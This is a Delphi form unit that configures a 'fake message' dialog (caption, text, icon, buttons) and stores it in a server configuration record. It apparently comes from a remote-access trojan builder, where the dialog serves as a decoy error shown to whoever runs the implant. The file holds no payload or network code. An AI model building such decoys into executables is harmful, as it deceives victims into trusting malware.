unit UnitFakeMessage;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, sPanel, unitMain;

type
  TFormFakeMessage = class(TForm)
    Panel1: TsPanel;
    CheckBox1: TCheckBox;
    Edit1: TEdit;
    Memo1: TMemo;
    AdvOfficeRadioGroup1: TRadioGroup;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Button1: TButton;
    AdvOfficeRadioGroup2: TRadioGroup;
    procedure FormShow(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
    procedure AtualizarIdiomas;
	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
  public
    { Public declarations }
  end;

var
  FormFakeMessage: TFormFakeMessage;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConfigs,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormFakeMessage.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdiomas;
end;  

procedure TFormFakeMessage.AtualizarIdiomas;
begin
  AdvOfficeRadioGroup1.Caption := traduzidos[428] + ':';
  AdvOfficeRadioGroup1.Items.Strings[0] := traduzidos[429];
  AdvOfficeRadioGroup1.Items.Strings[1] := traduzidos[430];
  AdvOfficeRadioGroup1.Items.Strings[2] := traduzidos[431];
  AdvOfficeRadioGroup1.Items.Strings[3] := traduzidos[432];
  AdvOfficeRadioGroup1.Items.Strings[4] := traduzidos[433];

  AdvOfficeRadioGroup2.Caption := traduzidos[434] + ':';
  AdvOfficeRadioGroup2.Items.Strings[0] := traduzidos[435];
  AdvOfficeRadioGroup2.Items.Strings[1] := traduzidos[436];
  AdvOfficeRadioGroup2.Items.Strings[2] := traduzidos[437];
  AdvOfficeRadioGroup2.Items.Strings[3] := traduzidos[438];
  AdvOfficeRadioGroup2.Items.Strings[4] := traduzidos[439];
  AdvOfficeRadioGroup2.Items.Strings[5] := traduzidos[440];

  CheckBox1.Caption := Traduzidos[570];
  Button1.Caption := Traduzidos[441];
end;

procedure TFormFakeMessage.Button1Click(Sender: TObject);
var
  mType, bType: cardinal;
begin
  if AdvOfficeRadioGroup2.ItemIndex = 0 then bType := MB_OK else
  if AdvOfficeRadioGroup2.ItemIndex = 1 then bType := MB_OKCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 2 then bType := MB_RETRYCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 3 then bType := MB_YESNO else
  if AdvOfficeRadioGroup2.ItemIndex = 4 then bType := MB_YESNOCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 5 then bType := MB_ABORTRETRYIGNORE;

  if AdvOfficeRadioGroup1.ItemIndex = 0 then mType := MB_ICONQUESTION else
  if AdvOfficeRadioGroup1.ItemIndex = 1 then mType := MB_ICONERROR else
  if AdvOfficeRadioGroup1.ItemIndex = 2 then mType := MB_ICONWARNING else
  if AdvOfficeRadioGroup1.ItemIndex = 3 then mType := MB_ICONINFORMATION else
  if AdvOfficeRadioGroup1.ItemIndex = 4 then mType := 0;

  messagebox(Handle, pchar(memo1.Text), pchar(edit1.Text), MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST or bType or mType);
end;

procedure TFormFakeMessage.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  Edit1.MaxLength := (SizeOf(ConfiguracoesServidor.FakeMessageCaption) div 2) - 1;
  Memo1.MaxLength := (SizeOf(ConfiguracoesServidor.FakeMessageText) div 2) - 5;
end;

procedure TFormFakeMessage.FormDestroy(Sender: TObject);
var
  s: WideString;
begin
  ConfiguracoesServidor.UseFakeMessage := CheckBox1.Checked;
  ConfiguracoesServidor.FakeMessageCaption := StrToLowArray(Edit1.Text);
  ConfiguracoesServidor.FakeMessageType := AdvOfficeRadioGroup1.ItemIndex;
  ConfiguracoesServidor.FakeMessageAnswer := AdvOfficeRadioGroup2.ItemIndex;
  s := Memo1.Text;
  CopyMemory(@ConfiguracoesServidor.FakeMessageText, @s[1], SizeOf(ConfiguracoesServidor.FakeMessageText));
end;

procedure TFormFakeMessage.FormShow(Sender: TObject);
var
  s: string;
begin
  AtualizarIdiomas;
  Edit1.Text := ConfiguracoesServidor.FakeMessageCaption;
  s := ConfiguracoesServidor.FakeMessageText;
  Memo1.Text := s;
  CheckBox1.Checked := ConfiguracoesServidor.UseFakeMessage;
  AdvOfficeRadioGroup1.ItemIndex := ConfiguracoesServidor.FakeMessageType;
  AdvOfficeRadioGroup2.ItemIndex := ConfiguracoesServidor.FakeMessageAnswer;
end;

end.
